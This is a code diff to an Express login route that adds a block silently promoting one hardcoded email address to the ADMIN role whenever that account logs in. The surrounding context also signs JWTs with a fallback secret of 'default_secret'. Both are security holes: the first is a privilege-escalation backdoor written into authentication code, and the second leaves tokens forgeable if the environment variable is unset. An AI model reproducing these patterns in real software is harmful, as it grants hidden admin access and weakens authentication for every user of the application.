@@ -46,6 +46,15 @@ router.post("/login", async (req, res) => {
       return res.status(400).json({ error: "Invalid email or password" });
     }
 
+    // Auto-upgrade to ADMIN if it's the specific email
+    if (user.email.toLowerCase().trim() === "junnuedits@gmail.com" && user.role !== "ADMIN") {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: "ADMIN" }
+      });
+      user.role = "ADMIN";
+    }
+
     const token = jwt.sign(
       { userId: user.id, role: user.role },
       process.env.JWT_SECRET || "default_secret",
